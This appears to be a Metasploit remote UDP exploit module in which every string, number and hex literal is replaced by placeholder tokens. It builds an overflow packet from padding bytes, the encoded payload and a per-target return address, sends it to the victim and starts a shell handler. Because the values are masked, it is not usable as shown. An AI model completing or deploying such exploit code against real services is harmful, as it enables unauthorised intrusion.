require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Udp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , <str> = > <str> , } , <str> = > true , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self ) end def exploit connect_udp sploit = [ <hex> ] . pack ( <str> ) sploit << [ <hex> ] . pack ( <str> ) sploit << payload . encoded sploit << [ target . ret ] . pack ( <str> ) sploit << rand_text_alpha_upper ( <int> ) print_status ( <str> target . name <str> ) udp_sock . put ( sploit ) select ( nil , nil , nil , <int> ) handler disconnect_udp end end 
